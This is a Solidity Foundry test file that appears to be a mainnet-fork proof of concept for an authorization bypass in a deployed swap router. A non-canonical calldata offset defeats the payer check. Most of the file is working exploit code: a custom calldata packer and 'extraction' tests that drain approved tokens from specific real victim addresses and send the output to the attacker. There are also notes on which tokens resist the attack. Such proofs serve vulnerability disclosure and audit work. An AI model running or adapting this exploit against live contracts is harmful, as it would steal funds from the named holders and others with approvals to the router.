// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function allowance(address, address) external view returns (uint256);
}

/// @title UniswapV4Router04 — mainnet-fork proof of the hardcoded-calldata-offset auth bypass.
/// @notice READ-ONLY: everything runs on a local fork. No transaction is signed or broadcast.
///
/// `swap(bytes data, uint256 deadline)` (selector 0xaf2b4aba) gates the payer with a HARDCODED
/// absolute calldata offset instead of decoding the `bytes` argument:
///
///   assembly ("memory-safe") {
///       if iszero(eq(calldataload(164), caller())) { mstore(0x00, 0x82b42900); revert(0x1c, 0x04) }
///   }
///
/// Under the canonical ABI encoding of `swap(bytes,uint256)` the `data` slice starts at calldata
/// 0x64, so its 3rd word (BaseData.payer) lands exactly at 0xa4 (=164). The ABI decoder never
/// validates the `data` offset word, so an attacker can set it to 0xc0, plant THEIR OWN address at
/// 0xa4 (a filler region that is NOT part of the decoded struct) to satisfy the gate, and put the
/// real `BaseData.payer = VICTIM` inside the slice that `_unlockCallback` actually decodes.
/// The callback then runs `inputCurrency.settle(poolManager, data.payer, inputAmount, false)`
/// -> `token.transferFrom(VICTIM, poolManager, amount)` against the victim's allowance to the
/// router, and `outputCurrency.take(poolManager, data.receiver, outputAmount, false)` sends the
/// swap output to the attacker.
contract UniswapV4Router04AuthBypassTest is Test {
    address constant ROUTER = 0x00000000000044a361Ae3cAc094c9D1b14Eece97;
    address constant PM = 0x000000000004444c5dc75cB358380D2e3dE08A90;

    address constant PNZI = 0x69110E7C73FdD75b6838461B31C096906f19e99E;
    address constant PNZI_VICTIM = 0x7363CC41220d5D298Fd74b4db9d53F59c97718C8;
    address constant PNZI_HOOK = 0xba806A6135c5CD93EcCe1258C28f57A8D291E0CC;

    address constant FR = 0x0699253C9dd45eAC803777A2FE19BAe09a4Bbd55;
    address constant FR_VICTIM = 0x6dC72BEB8289Db02dC861804d74bCC03eaEa280F;
    address constant FR_HOOK = 0x17B796AF8d8d0E4cb0c7947487267cD48b3CC0CC;

    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant USDT_VICTIM = 0x650532B5Db628DDa2557340e8521b0D11cb240cf;
    address constant SPUNK = 0x618724546cBeB90aca45eB3Edf0D65041A5215cb;
    address constant SPUNK_VICTIM = 0x64924DdDD4bF7ca9659D7D2Ceb2eD7618b226dc5;

    bytes4 constant SEL_SWAP = 0xaf2b4aba;
    bytes4 constant UNAUTHORIZED = 0x82b42900;

    uint256 forkedBlock;

    struct BaseData {
        uint256 amount;
        uint256 amountLimit;
        address payer;
        address receiver;
        uint8 flags;
    }
    struct PoolKey {
        address currency0;
        address currency1;
        uint24 fee;
        int24 tickSpacing;
        address hooks;
    }

    receive() external payable {}

    function setUp() public {
        // Fork at head, or at an explicit archive block when PIN_BLOCK is provided.
        string memory rpc =
            vm.envOr("FORK_RPC_URL", vm.envOr("RPC_URL", string("https://ethereum-rpc.publicnode.com")));
        uint256 pin = vm.envOr("PIN_BLOCK", uint256(0));
        if (pin == 0) {
            vm.createSelectFork(rpc);
        } else {
            vm.createSelectFork(rpc, pin);
        }
        forkedBlock = block.number;
        emit log_named_uint("fork block (pinned at run time)", forkedBlock);
    }

    // ------------------------------------------------------------------ helpers

    /// @dev abi.encode(BaseData, bool zeroForOne, PoolKey, bytes hookData) exactly as
    ///      `_unlockCallback` expects for a SINGLE_SWAP (flags bit 0) non-permit2 (bit 4 clear) swap.
    function _content(uint256 amount, address payer, address receiver, bool zeroForOne, PoolKey memory pk)
        internal
        view
        returns (bytes memory)
    {
        BaseData memory bd = BaseData({amount: amount, amountLimit: 0, payer: payer, receiver: receiver, flags: 1});
        return abi.encode(bd, zeroForOne, pk, bytes(""));
    }

    function _canonical(bytes memory content) internal view returns (bytes memory) {
        return abi.encodeWithSelector(SEL_SWAP, content, block.timestamp + 1);
    }

    /// @dev Hand-packed calldata with a caller-chosen `data` offset word. When `offsetWord != 0x40`
    ///      the 32-byte word at absolute calldata offset 164 (0xa4) is free filler, decoupled from
    ///      the decoded `BaseData.payer`.
    function _nonCanonical(bytes memory content, uint256 offsetWord, address filler)
        internal
        view
        returns (bytes memory cd)
    {
        uint256 total = 4 + offsetWord + 32 + content.length;
        cd = new bytes(total);
        assembly ("memory-safe") {
            mstore(add(cd, 32), shl(224, 0xaf2b4aba)) // selector at bytes[0..4]
            mstore(add(cd, 36), offsetWord) // `data` offset word at bytes[4..36]
            mstore(add(cd, 68), not(0)) // deadline at bytes[36..68]
            mstore(add(cd, 196), filler) // filler at bytes[164..196] == calldataload(164)
            let n := mload(content)
            mstore(add(add(cd, 36), offsetWord), n) // slice length word
            let src := add(content, 32)
            let dst := add(add(cd, 68), offsetWord) // slice content
            for { let i := 0 } lt(i, n) { i := add(i, 32) } { mstore(add(dst, i), mload(add(src, i))) }
        }
    }

    function _pnziKey() internal pure returns (PoolKey memory) {
        return PoolKey({currency0: address(0), currency1: PNZI, fee: 0, tickSpacing: 200, hooks: PNZI_HOOK});
    }

    function _frKey() internal pure returns (PoolKey memory) {
        return PoolKey({currency0: address(0), currency1: FR, fee: 10000, tickSpacing: 200, hooks: FR_HOOK});
    }

    function _usdtKey() internal pure returns (PoolKey memory) {
        return PoolKey({currency0: address(0), currency1: USDT, fee: 500, tickSpacing: 10, hooks: address(0)});
    }

    function _drainable(address token, address owner) internal view returns (uint256) {
        uint256 a = IERC20(token).allowance(owner, ROUTER);
        uint256 b = IERC20(token).balanceOf(owner);
        return a < b ? a : b;
    }

    function _sel(bytes memory ret) internal pure returns (bytes4 s) {
        if (ret.length >= 4) {
            assembly {
                s := mload(add(ret, 32))
            }
        }
    }

    // ------------------------------------------------------------------ auth-bypass proofs

    /// @notice The bypass, independent of any live allowance: with a non-canonical `data` offset the
    ///         gate reads attacker filler while the decoded BaseData.payer is a DIFFERENT address.
    ///         Proven with an uninitialised pool, so the call only fails later inside PoolManager
    ///         (never with Unauthorized).
    function test_bypass_nonCanonicalOffset_passesAuthGate() public {
        PoolKey memory bogus = PoolKey({
            currency0: address(0x0000000000000000000000000000000000000001),
            currency1: address(0x0000000000000000000000000000000000000002),
            fee: 0,
            tickSpacing: 60,
            hooks: address(0)
        });
        bytes memory cd = _nonCanonical(_content(1, USDT_VICTIM, address(this), false, bogus), 0xc0, address(this));
        (bool ok, bytes memory ret) = ROUTER.call(cd);
        assertFalse(ok, "expected a later failure (pool not initialised)");
        assertTrue(_sel(ret) != UNAUTHORIZED, "auth gate was NOT bypassed (got Unauthorized)");
        emit log_named_bytes("later revert (not Unauthorized)", ret);
    }

    /// @notice Negative control: canonical offset -> the gate reads the real decoded payer (the
    ///         victim) and the attacker's call is rejected with Unauthorized().
    function test_control_canonicalOffset_revertsUnauthorized() public {
        bytes memory cd = _canonical(_content(1, USDT_VICTIM, address(this), false, _pnziKey()));
        (bool ok, bytes memory ret) = ROUTER.call(cd);
        assertFalse(ok, "canonical-offset spoof must revert");
        assertEq(_sel(ret), UNAUTHORIZED, "expected Unauthorized()");
    }

    /// @notice Negative control: non-canonical offset but the filler word != msg.sender ->
    ///         Unauthorized().
    function test_control_fillerMismatch_revertsUnauthorized() public {
        bytes memory cd =
            _nonCanonical(_content(1, USDT_VICTIM, address(this), false, _pnziKey()), 0xc0, address(0xdeadbeef));
        (bool ok, bytes memory ret) = ROUTER.call(cd);
        assertFalse(ok, "filler-mismatch spoof must revert");
        assertEq(_sel(ret), UNAUTHORIZED, "expected Unauthorized()");
    }

    // ------------------------------------------------------------------ live value extraction

    /// @notice End-to-end drain of the PNZI victim's approved balance: input PNZI is pulled from the
    ///         victim and the ETH output is delivered to the attacker.
    function test_extract_PNZI_victim() public {
        _extract(PNZI, PNZI_VICTIM, _pnziKey(), "PNZI");
    }

    /// @notice End-to-end drain of the FR victim's approved balance.
    function test_extract_FR_victim() public {
        _extract(FR, FR_VICTIM, _frKey(), "FR");
    }

    function _extract(address token, address victim, PoolKey memory pk, string memory label) internal {
        uint256 amount = _drainable(token, victim);
        emit log_named_uint(string.concat(label, " victim drainable (min allowance,balance)"), amount);
        assertGt(amount, 0, "victim has no drainable balance at this fork block");

        uint256 victimBefore = IERC20(token).balanceOf(victim);
        uint256 attackerEthBefore = address(this).balance;

        bytes memory cd = _nonCanonical(_content(amount, victim, address(this), false, pk), 0xc0, address(this));
        uint256 gasBefore = gasleft();
        (bool ok, bytes memory ret) = ROUTER.call(cd);
        emit log_named_uint(string.concat(label, " exploit gas used"), gasBefore - gasleft());
        if (!ok) emit log_named_bytes("revert", ret);
        assertTrue(ok, "extraction call failed");

        assertEq(IERC20(token).balanceOf(victim), victimBefore - amount, "victim token not drained");
        assertGt(address(this).balance, attackerEthBefore, "attacker received no ETH output");
        emit log_named_uint(string.concat(label, " drained (raw)"), amount);
        emit log_named_uint("attacker ETH gained (wei)", address(this).balance - attackerEthBefore);
    }

    // ------------------------------------------------------------------ documented negatives

    /// @notice NEGATIVE (adversarial check): the bypass works for USDT too, but the router's settle
    ///         path calls `IERC20Minimal(USDT).transferFrom(...)`, and USDT returns NO data. Solidity
    ///         validates the 32-byte `bool` return even when it is discarded, so the router reverts
    ///         with EMPTY data and no USDT is moved. USDT is therefore NOT drainable through this path.
    function test_negative_USDT_settleReverts_emptyReturnData() public {
        uint256 amount = _drainable(USDT, USDT_VICTIM);
        uint256 victimBefore = IERC20(USDT).balanceOf(USDT_VICTIM);
        bytes memory cd = _nonCanonical(_content(amount, USDT_VICTIM, address(this), false, _usdtKey()), 0xc0, address(this));
        (bool ok, bytes memory ret) = ROUTER.call(cd);
        emit log_named_uint("USDT attempt ok", ok ? 1 : 0);
        emit log_named_uint("USDT attempt revert length", ret.length);
        assertFalse(ok, "USDT settle unexpectedly succeeded");
        assertEq(ret.length, 0, "expected the empty ABI-decode revert");
        assertEq(IERC20(USDT).balanceOf(USDT_VICTIM), victimBefore, "USDT must not move");
    }

    /// @notice NEGATIVE (adversarial check): the SPUNK token's own transferFrom rejects the router
    ///         with `NotValidRouter()` (0x3d04e56e), so its (larger) approval is not drainable.
    function test_negative_SPUNK_transferFrom_NotValidRouter() public {
        uint256 amount = _drainable(SPUNK, SPUNK_VICTIM);
        vm.prank(ROUTER);
        (bool ok, bytes memory ret) =
            SPUNK.call(abi.encodeWithSelector(0x23b872dd, SPUNK_VICTIM, PM, amount));
        assertFalse(ok, "SPUNK transferFrom from the router unexpectedly succeeded");
        assertEq(_sel(ret), bytes4(0x3d04e56e), "expected NotValidRouter()");
    }
}
